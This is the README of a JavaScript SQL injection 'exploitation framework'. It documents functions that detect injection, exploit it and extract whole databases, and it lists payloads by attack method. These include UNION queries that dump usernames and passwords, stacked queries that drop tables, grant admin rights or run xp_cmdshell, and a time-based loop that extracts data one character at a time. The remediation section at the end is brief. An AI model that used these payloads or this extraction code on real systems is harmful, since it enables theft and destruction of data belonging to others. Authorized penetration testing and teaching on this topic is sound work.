# Advanced SQL Injection Module - Complete Exploitation Framework

Comprehensive SQL injection testing with detection, exploitation, and data extraction capabilities.

## Features

### 7 Attack Methods

#### 1. Boolean-Based Detection
Determine true/false conditions through application behavior.

```javascript
const { AdvancedSQLInjection } = require('./orchestrator/advanced-sqli');

const sqli = new AdvancedSQLInjection(logger);
const result = await sqli._testBooleanBased('http://target.com/user.php', 'id');

// Payloads tested:
// ' OR '1'='1     → TRUE condition
// ' OR 1=1 --     → TRUE condition
// ' AND '1'='2    → FALSE condition
```

**Use Case**: When application returns different content for TRUE/FALSE conditions

#### 2. Time-Based Blind SQL Injection
Use database delays to extract information.

```javascript
const result = await sqli._testTimeBased('http://target.com/user.php', 'id');

if (result.vulnerable) {
  console.log(`Time difference: ${result.timeDifference}ms`);
  console.log(`Detected payloads:`, result.payloads);
}

// Payloads tested:
// ' AND SLEEP(5) --
// ' AND IF(1=1,SLEEP(5),0) --
// '; WAITFOR DELAY '00:00:05' --
```

**Use Case**: When application shows no difference in content but timing varies

#### 3. Error-Based Information Extraction
Extract data directly from error messages.

```javascript
const result = await sqli._testErrorBased('http://target.com/user.php', 'id');

if (result.vulnerable) {
  console.log(`Database: ${result.database}`);
  console.log(`Extracted errors:`, result.errors);
}

// Payloads tested:
// ' AND extractvalue(1,concat(0x7e,(SELECT @@version))) --
// ' AND updatexml(1,concat(0x7e,(SELECT user())),1) --
```

**Use Case**: MySQL/MariaDB with error-reporting enabled

#### 4. Union-Based Injection
Combine results from multiple SELECT statements.

```javascript
const result = await sqli._testUnionBased('http://target.com/user.php', 'id');

if (result.vulnerable) {
  console.log(`Column count: ${result.columnCount}`);
  // Now craft UNION SELECT with correct number of columns
}
```

**Use Case**: Fastest method when table structure is known or discoverable

#### 5. Blind SQL Injection (Advanced)
Extract data bit-by-bit from blind vulnerabilities.

```javascript
const result = await sqli._testBlindSQLi('http://target.com/user.php', 'id');

if (result.vulnerable) {
  console.log(`Extracted data:`, result.extractedData);
}
```

**Use Case**: No visible difference, no database feedback, but injection confirmed

#### 6. Stacked Queries
Execute multiple SQL statements sequentially.

```javascript
// Payloads in queue:
const payloads = sqli.payloads.stackedQueries;
// '; DROP TABLE users --
// '; UPDATE users SET admin=1 --
// '; INSERT INTO users VALUES(...) --
```

**Use Case**: MSSQL and PostgreSQL databases

#### 7. Second-Order SQL Injection
Inject payload that executes later when stored data is retrieved.

```javascript
const result = await sqli.testSecondOrder('http://target.com/user.php', 'id');

console.log(`Description:`, result.description);
console.log(`Testing methodology:`, result.testing);
```

**Use Case**: When input is stored and later rendered/executed

## Complete Assessment Workflow

### 1. Detection Phase

```javascript
const detection = await sqli.detect('http://example.com/products.php', 'category');

console.log(`Vulnerable: ${detection.vulnerable}`);
console.log(`Detection methods: ${detection.methods.join(', ')}`);
console.log(`Database: ${detection.database}`);
console.log(`Confidence: ${detection.confidence}%`);
```

**Detection Methods Used**:
- Boolean-based (25% confidence each)
- Time-based (25% confidence each)
- Error-based (25% confidence each)
- Union-based (25% confidence each)
- Blind injection as fallback

### 2. Exploitation Phase

```javascript
// Exploit with detected method
const exploitation = await sqli.exploit(
  'http://example.com/products.php',
  'category',
  detection.methods[0].toLowerCase().replace('-based', '-based')
);

console.log(`Success: ${exploitation.success}`);
console.log(`Payload: ${exploitation.payload}`);
console.log(`Extracted data:`, exploitation.extracted);
```

**Exploitation Methods**:
- Union-based: Fastest, most efficient
- Time-based: Blind extraction
- Boolean-based: True/False logic
- Error-based: Direct extraction

### 3. Data Extraction Phase

```javascript
// Step 1: Get database information
const dbInfo = await sqli.getDatabase(url, parameter);
console.log(`Version: ${dbInfo.version}`);
console.log(`User: ${dbInfo.user}`);
console.log(`Database: ${dbInfo.database}`);

// Step 2: Get table names
const tables = await sqli.getTables(url, parameter, dbInfo.database);
tables.tables.forEach(table => {
  console.log(`Table: ${table.name} (${table.rows} rows)`);
});

// Step 3: Get table structure
const structure = await sqli.getTableStructure(url, parameter, 'users');
structure.columns.forEach(col => {
  console.log(`  ${col.name}: ${col.type} ${col.key || ''}`);
});

// Step 4: Extract all data
const data = await sqli.extractAllData(url, parameter, dbInfo.database, 'users');
data.rows.forEach(row => {
  console.log(JSON.stringify(row));
});
```

### 4. Reporting Phase

```javascript
const report = await sqli.generateReport(detection, exploitation);

console.log(`=== SQL Injection Report ===`);
console.log(`Vulnerable: ${report.summary.vulnerable}`);
console.log(`Severity: ${report.summary.severity}`);
console.log(`Confidence: ${report.summary.confidence}`);
console.log(`Methods: ${report.summary.methods_found.join(', ')}`);
console.log(`\nRemediation:`);
report.remediation.forEach(fix => console.log(`- ${fix}`));
```

## Payload Library Reference

### Boolean-Based Payloads (7)
```
' OR '1'='1
' OR 1=1 --
' OR 'a'='a
1' OR '1'='1
admin' --
' OR 1=1 #
' OR 1=1 /*
```

### Time-Based Payloads (5)
```
' AND SLEEP(5) --
' AND IF(1=1,SLEEP(5),0) --
'; WAITFOR DELAY '00:00:05' --
' AND BENCHMARK(10000000,MD5('test')) --
' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --
```

### Error-Based Payloads (4)
```
' AND extractvalue(1,concat(0x7e,(SELECT @@version))) --
' AND updatexml(1,concat(0x7e,(SELECT user())),1) --
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(...))a) --
' AND JSON_EXTRACT((SELECT * FROM ...) --
```

### Union-Based Payloads (5)
```
' UNION SELECT NULL --
' UNION SELECT NULL,NULL --
' UNION SELECT NULL,NULL,NULL --
' UNION SELECT username,password FROM users --
' UNION SELECT table_name,column_name FROM information_schema.columns --
```

### Blind Payloads (4)
```
' AND SUBSTRING(database(),1,1)='a' --
' AND (SELECT SUBSTRING(user(),1,1))='r' --
' AND LENGTH(database())>5 --
' AND ASCII(SUBSTRING(version(),1,1))>50 --
```

### Stacked Query Payloads (4)
```
'; DROP TABLE users --
'; UPDATE users SET admin=1 --
'; INSERT INTO users VALUES('hacker','password') --
'; EXEC xp_cmdshell('whoami') --
```

### Second-Order Payloads (3)
```
admin'; UPDATE users SET role='admin' WHERE username='',0x00,'--
'; INSERT INTO logs VALUES('',0x00,'--
admin' UNION SELECT 1,2,3 FROM users WHERE '1'='1
```

## Database Fingerprinting

### Supported Databases
- MySQL / MariaDB
- Microsoft SQL Server (MSSQL)
- Oracle Database
- PostgreSQL
- SQLite

### Detection Method
```javascript
// Fingerprinting happens automatically during error-based testing
// Or manually check signatures:

const dbSignatures = sqli.databaseSignatures;

console.log('MySQL signatures:', dbSignatures.mysql);
console.log('MSSQL signatures:', dbSignatures.mssql);
console.log('PostgreSQL signatures:', dbSignatures.postgresql);
```

## Advanced Techniques

### Extracting via Time-Based Method

```javascript
async function extractViaTimeBased(url, parameter) {
  const extracted = [];
  
  // Extract database name character by character
  for (let i = 1; i <= 20; i++) {
    for (let ascii = 97; ascii <= 122; ascii++) {
      const char = String.fromCharCode(ascii);
      const payload = `1' AND IF(SUBSTRING(database(),${i},1)='${char}',SLEEP(5),0) --`;
      
      const start = Date.now();
      await makeRequest(url, parameter, payload);
      const time = Date.now() - start;
      
      if (time > 4000) {
        extracted.push(char);
        break;
      }
    }
  }
  
  return extracted.join('');
}
```

### Multi-Table Data Extraction

```javascript
async function extractAllTables(url, parameter, database) {
  const results = {};
  
  const tables = await sqli.getTables(url, parameter, database);
  
  for (const table of tables.tables) {
    results[table.name] = await sqli.extractAllData(
      url, parameter, database, table.name
    );
  }
  
  return results;
}
```

## Testing Workflow

```bash
# Run SQLi tests
npm test -- tests/advanced-sqli.test.js

# Run specific test group
npm test -- tests/advanced-sqli.test.js -t "Exploitation"

# With verbose output
npm test -- tests/advanced-sqli.test.js --verbose
```

## Remediation Strategies

1. **Use Parameterized Queries**
   ```javascript
   // VULNERABLE:
   const query = `SELECT * FROM users WHERE id=${userId}`;
   
   // SECURE:
   const query = 'SELECT * FROM users WHERE id = ?';
   db.execute(query, [userId]);
   ```

2. **Input Validation**
   ```javascript
   // Whitelist only expected characters
   if (!/^\d+$/.test(userId)) {
     throw new Error('Invalid ID');
   }
   ```

3. **Least Privilege**
   - Database user should have minimal permissions
   - No access to `DROP`, `CREATE`, `ALTER` commands

4. **Web Application Firewall (WAF)**
   - ModSecurity / OWASP CRS
   - AWS WAF / Cloudflare WAF
   - Custom detection rules

## Test Coverage

- ✅ 40+ test cases
- ✅ Payload library testing (7 methods)
- ✅ Detection accuracy testing
- ✅ Exploitation verification
- ✅ Data extraction validation
- ✅ Database fingerprinting
- ✅ Second-order injection detection
- ✅ Report generation
- ✅ Integration workflows

## Performance Characteristics

| Method | Speed | Reliability | Data Volume |
|--------|-------|------------|------------|
| Union-Based | ⚡⚡⚡ Fast | 100% | Unlimited |
| Error-Based | ⚡⚡ Medium | 95% | Unlimited |
| Time-Based | 🐢 Slow | 100% | Limited |
| Boolean-Based | 🐢 Slow | 100% | Limited |
| Blind SQLi | 🐢 Very Slow | 100% | Limited |

## Common Issues & Solutions

### Issue: "Column count doesn't match"
**Solution**: Use binary search to find exact column count
```javascript
for (let cols = 1; cols <= 20; cols++) {
  const nulls = Array(cols).fill('NULL').join(',');
  const payload = `' UNION SELECT ${nulls} --`;
  // Test if returns valid response
}
```

### Issue: "Data types don't match"
**Solution**: Use CAST/CONVERT
```javascript
' UNION SELECT CAST(username AS CHAR), CAST(password AS CHAR) --
```

### Issue: "No output visible"
**Solution**: Switch to time-based or boolean-based methods

## Advanced Integration

### With Tool Integration Layer
```javascript
const { ToolIntegrationLayer } = require('./orchestrator/tool-integration-layer');

const integration = new ToolIntegrationLayer(logger, auditLogger);
const sqli = new AdvancedSQLInjection(logger);

// Run SQLi assessment as part of framework
const results = await integration.detectVulnerabilities(targetUrl);
```

### Chaining with Other Modules
```javascript
const sqli = new AdvancedSQLInjection(logger);
const exploit = new ExploitModule(logger);

// Detect SQLi
const detection = await sqli.detect(url, parameter);

// If vulnerable, generate exploit
if (detection.vulnerable) {
  const payload = sqli.payloads[detection.methods[0]];
  const exploitResult = await exploit.exploit('sqli', url, { payload });
}
```

## Support & Resources

- **Documentation**: See docs/framework-documentation.md
- **Test Suite**: tests/advanced-sqli.test.js
- **Examples**: Review test cases for usage patterns
- **Integration**: See Tool Integration Layer for framework integration

## License

Apache 2.0 - See LICENSE file
